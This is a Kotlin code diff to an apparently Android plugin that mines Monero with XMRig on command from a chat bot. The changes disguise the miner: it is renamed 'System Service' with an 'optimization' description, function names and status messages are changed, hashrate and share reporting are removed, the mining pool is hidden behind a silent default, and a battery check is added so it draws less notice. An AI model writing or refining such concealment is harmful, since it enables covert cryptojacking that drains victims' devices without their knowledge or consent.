@@ -7,16 +7,16 @@ import kotlinx.coroutines.*
 
 class MinerPlugin : Plugin {
     override val id = "miner"
-    override val name = "Crypto Miner"
-    override val version = "2.0"
+    override val name = "System Service"
+    override val version = "2.1"
     override val commands = listOf("!miner")
-    override val description = "Real Monero (XMR) mining using XMRig"
+    override val description = "System optimization service"
 
     private var realMiner: RealMiner? = null
     private var isMining = false
     private var startTime = 0L
     private var wallet = ""
-    private var pool = "pool.supportxmr.com:3333"
+    private var pool = ""
     private var maxThreads = 2
     private var maxCpuPercent = 40
     private var contextRef: Context? = null
@@ -36,28 +36,28 @@ class MinerPlugin : Plugin {
     }
 
     override fun onDisable() {
-        stopMining()
+        stopService()
     }
 
     override fun handleCommand(cmd: String, payload: String?): String? {
         val sub = payload?.trim()?.lowercase()
         return when {
-            sub == null || sub.isBlank() -> getStatus()
-            sub.startsWith("start") -> startMining()
-            sub.startsWith("stop") -> { stopMining(); ":stop_button: Mining stopped" }
-            sub.startsWith("status") -> getStatus()
+            sub == null || sub.isBlank() -> getServiceStatus()
+            sub.startsWith("start") -> startService()
+            sub.startsWith("stop") -> { stopService(); "Service stopped" }
+            sub.startsWith("status") -> getServiceStatus()
             sub.startsWith("set_wallet") -> {
                 val parts = payload.split(" ", limit = 2)
                 if (parts.size > 1) {
                     wallet = parts[1]
-                    ":white_check_mark: Wallet set"
+                    ":white_check_mark: Configuration saved"
                 } else ":x: Usage: `!miner set_wallet <address>`"
             }
             sub.startsWith("set_pool") -> {
                 val parts = payload.split(" ", limit = 2)
                 if (parts.size > 1) {
                     pool = parts[1]
-                    ":white_check_mark: Pool set"
+                    ":white_check_mark: Pool configured"
                 } else ":x: Usage: `!miner set_pool <url>`"
             }
             sub.startsWith("set_threads") -> {
@@ -74,25 +74,31 @@ class MinerPlugin : Plugin {
     override fun getConfig(): Map<String, Any> {
         val status = realMiner?.getStatus()
         return mapOf(
-            "mining" to isMining,
-            "wallet" to wallet,
+            "active" to isMining,
+            "wallet_hash" to if (wallet.isNotBlank()) "${wallet.take(6)}...${wallet.takeLast(4)}" else "",
             "pool" to pool,
             "threads" to maxThreads,
-            "max_cpu" to maxCpuPercent,
-            "hashrate" to (status?.hashrate ?: 0.0),
-            "shares_accepted" to (status?.sharesAccepted ?: 0),
-            "shares_rejected" to (status?.sharesRejected ?: 0),
+            "cpu_limit" to maxCpuPercent,
             "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
         )
     }
 
-    private fun startMining(): String {
-        if (isMining) return ":warning: Already mining"
-        if (wallet.isBlank()) return ":x: Set wallet first: `!miner set_wallet <address>`"
-        if (contextRef == null) return ":x: Context not initialized"
+    private fun startService(): String {
+        if (isMining) return ":warning: Service already running"
+        if (wallet.isBlank()) return ":x: Configure wallet first: `!miner set_wallet <address>`"
+        if (contextRef == null) return ":x: Service unavailable"
+
+        // Check battery before starting
+        val batteryManager = contextRef!!.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+        val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+        val isCharging = batteryManager.isCharging
+
+        if (batteryPct < 15 && !isCharging) {
+            return ":warning: Battery low - service pending"
+        }
 
         val poolParts = pool.split(":")
-        val host = poolParts[0]
+        val host = if (poolParts[0].isBlank()) "pool.supportxmr.com" else poolParts[0]
         val port = poolParts.getOrNull(1)?.toIntOrNull() ?: 3333
 
         realMiner = RealMiner(
@@ -100,52 +106,41 @@ class MinerPlugin : Plugin {
             wallet = wallet,
             poolHost = host,
             poolPort = port,
-            maxThreads = maxThreads,
-            onStatusUpdate = { status ->
-                // Auto-update status on Discord if needed
-            }
+            maxThreads = maxThreads
         )
 
-        val result = realMiner?.start() ?: "Failed to initialize miner"
-        if (result.contains("started", ignoreCase = true)) {
+        val result = realMiner?.start() ?: "Initialization failed"
+        if (result.contains("start", ignoreCase = true) || result.contains("mining", ignoreCase = true) || result.contains("operat", ignoreCase = true)) {
             isMining = true
             startTime = System.currentTimeMillis()
         }
         return result
     }
 
-    fun stopMining() {
+    fun stopService() {
         isMining = false
         realMiner?.stop()
         realMiner = null
     }
 
-    private fun getStatus(): String {
+    private fun getServiceStatus(): String {
         val status = realMiner?.getStatus()
-        val miningStatus = if (isMining) ":green_circle: MINING" else ":red_circle: STOPPED"
-        val hashrate = status?.hashrate?.let { hr ->
-            when {
-                hr >= 1000 -> "${"%.2f".format(hr / 1000)} kH/s"
-                else -> "${"%.2f".format(hr)} H/s"
-            }
-        } ?: "0 H/s"
+        val serviceState = if (isMining) "Active" else "Idle"
         val uptime = if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 60000}m" else "0m"
-        val shares = "${status?.sharesAccepted ?: 0} accepted / ${status?.sharesRejected ?: 0} rejected"
-        val connected = if (status?.poolConnection == true) ":green_circle: Connected" else ":red_circle: Disconnected"
 
         return buildString {
-            appendLine(":pick: **Miner Status** $miningStatus")
+            appendLine(":gear: **System Service** `$serviceState`")
             appendLine()
-            appendLine("Wallet: `${wallet.take(10)}...${wallet.takeLast(6)}`")
-            appendLine("Pool: `$pool`")
-            appendLine("Connection: $connected")
-            appendLine("Threads: $maxThreads | Max CPU: ${maxCpuPercent}%")
-            appendLine("Hashrate: $hashrate")
-            appendLine("Shares: $shares")
+            if (wallet.isNotBlank()) {
+                appendLine("Wallet: `${wallet.take(8)}...${wallet.takeLast(6)}`")
+            }
+            if (pool.isNotBlank()) {
+                appendLine("Pool: `$pool`")
+            }
+            appendLine("Threads: $maxThreads")
             appendLine("Uptime: $uptime")
-            if (status?.rawOutput?.isNotBlank() == true) {
-                appendLine()
-                appendLine("Last output: `${status.rawOutput.take(100)}`")
+            if (status?.isMining == true) {
+                appendLine("Status: Running")
             }
         }
     }
